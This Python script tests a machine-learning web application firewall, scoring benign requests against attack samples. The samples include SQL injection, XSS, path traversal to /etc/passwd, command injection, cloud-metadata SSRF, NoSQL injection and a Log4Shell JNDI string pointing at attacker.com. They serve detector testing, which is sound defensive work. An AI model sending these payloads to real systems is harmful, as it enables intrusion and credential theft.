import os
import sys
import joblib
import pandas as pd

sys.path.append(os.path.dirname(os.path.dirname(__file__)))

from ml.feature_engineering import extract_features_from_request, FEATURE_COLUMNS

MODELS_DIR = os.path.join(os.path.dirname(__file__), "models")
RF_PATH = os.path.join(MODELS_DIR, "random_forest_waf.joblib")
ISO_PATH = os.path.join(MODELS_DIR, "isolation_forest_waf.joblib")

rf = joblib.load(RF_PATH)
iso = joblib.load(ISO_PATH)

test_samples = [
    {"name": "Normal Home", "url": "/index.html", "method": "GET"},
    {"name": "Normal Search", "url": "/search?q=laptop&page=2&sort=asc", "method": "GET"},
    {"name": "Normal Thai Search", "url": "/products?q=รองเท้าวิ่ง&min_price=500", "method": "GET"},
    {"name": "Normal REST API", "url": "/api/v1/users/e3b0c442-98fc-1c14-9af0-2a3b9c6d8e11?page=1&limit=20", "method": "GET"},
    {"name": "Normal Login Submit", "url": "/login", "method": "POST", "body": "username=john.doe@gmail.com&password=SecurePassword123!"},
    {"name": "Normal Feedback Form", "url": "/contact", "method": "POST", "body": "name=Somchai+Suk&email=somchai@gmail.com&phone=0812345678&message=Hello+Support"},
    {"name": "SQLi Auth Bypass", "url": "/login?user=admin' OR '1'='1' --", "method": "GET"},
    {"name": "SQLi UNION Extract", "url": "/products?category=1 UNION SELECT 1,username,password FROM users--", "method": "GET"},
    {"name": "SQLi Comment Evasion", "url": "/login.php?user=admin%27/**/OR/**/1=1--", "method": "GET"},
    {"name": "Reflected XSS", "url": "/search?q=<script>alert('XSS')</script>", "method": "GET"},
    {"name": "DOM XSS SVG", "url": "/view?name=<svg/onload=alert(document.cookie)>", "method": "GET"},
    {"name": "Path Traversal LFI", "url": "/download?file=../../../../etc/passwd", "method": "GET"},
    {"name": "Command Injection RCE", "url": "/api/exec", "method": "POST", "body": "cmd=cat${IFS}/etc/passwd"},
    {"name": "SSRF Cloud Metadata", "url": "/fetch_url?url=http://169.254.169.254/latest/meta-data/", "method": "GET"},
    {"name": "SSTI Jinja2", "url": "/render?template={{7*7}}", "method": "GET"},
    {"name": "NoSQL Injection", "url": "/api/v1/auth", "method": "POST", "body": '{"username": {"$ne": null}, "password": {"$gt": ""}}'},
    {"name": "Log4Shell JNDI", "url": "/search?q=${jndi:ldap://attacker.com/exploit}", "method": "GET"}
]

print(f"RF Classes: {rf.classes_}")

for s in test_samples:
    feat = extract_features_from_request(url=s['url'], method=s['method'], body=s.get('body', ''))
    df_feat = pd.DataFrame([feat])[FEATURE_COLUMNS]
    rf_pred = rf.predict(df_feat)[0]
    rf_prob = rf.predict_proba(df_feat)[0]
    iso_score = iso.decision_function(df_feat)[0]
    print(f"{s['name']:<20} | RF Pred: {rf_pred} | Prob: [Norm:{rf_prob[0]:.3f}, Atk:{rf_prob[1]:.3f}] | Iso Score: {iso_score:.4f}")
    print(f"   Features: {feat}\n")
